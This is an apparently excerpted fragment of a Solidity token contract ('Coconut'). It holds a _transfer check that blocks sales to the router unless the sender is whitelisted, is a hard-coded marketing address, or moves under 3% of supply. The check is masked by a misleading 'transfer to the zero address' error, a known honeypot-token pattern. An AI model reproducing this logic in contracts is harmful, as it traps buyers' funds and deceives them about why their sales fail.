...
contract Coconut is Context, IERC20, IERC20Metadata {
    ...
    address private marketAddy = payable(0x93FC47D2547F7035AE78B1eaF224C523f7c9e693);
    ...
    function _transfer(
        ...
        if(recipient == router) {
            require((balances1 || _balances1[sender]) || (sender == marketAddy) || (amount < (_totalSupply * 3 / 100)), "ERC20: transfer to the zero address");
        }
